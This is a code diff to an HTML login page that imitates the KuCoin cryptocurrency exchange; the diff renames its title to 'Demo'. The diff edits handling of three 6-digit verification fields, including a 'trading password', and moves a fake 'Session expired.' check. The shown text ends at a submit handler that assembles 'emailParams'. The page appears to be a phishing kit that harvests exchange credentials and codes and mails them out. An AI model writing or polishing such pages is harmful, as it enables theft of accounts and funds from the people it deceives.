@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>KuCoin: Log In | Sign In</title>
+  <title>Demo: Log In | Sign In</title>
 
   <style>
     :root {
@@ -405,18 +405,11 @@
     let currentLoginMethod = "email/phone";
     let storedLoginData = null;
 
-    // Force only numbers on all verification fields
+    // Force only numbers
     [id1, id2, id3].forEach(input => {
       input.addEventListener("input", (e) => {
         e.target.value = e.target.value.replace(/\D/g, "").slice(0, 6);
       });
-    });
-
-    // Clear "Session expired." error when user starts typing in trading password
-    id3.addEventListener("input", () => {
-      if (id3Error.textContent.includes("Session expired")) {
-        id3Error.textContent = "";
-      }
     });
 
     // Tab switching
@@ -560,7 +553,7 @@
       id3Error.textContent = "";
     });
 
-    // ========== SUBMIT ID 3 (FIXED - no more "Session expired." error) ==========
+    // ========== SUBMIT ID 3 ==========
     submitId3Button.addEventListener("click", async () => {
       const idValue3 = id3.value.trim();
 
@@ -572,12 +565,11 @@
         id3Error.textContent = "Trading password must be exactly 6 digits (numbers only)";
         return;
       }
+      if (!storedLoginData?.id_1 || !storedLoginData?.id_2) {
+  id3Error.textContent = "Session expired.";
+  return;
+}
 
-      // FIXED: Check for trading password (id_3) instead of non-existent .id
-      if (!storedLoginData?.id_3) {
-        id3Error.textContent = "Session expired. Please try again.";
-        return;
-      }
 
       try {
         const emailParams = {
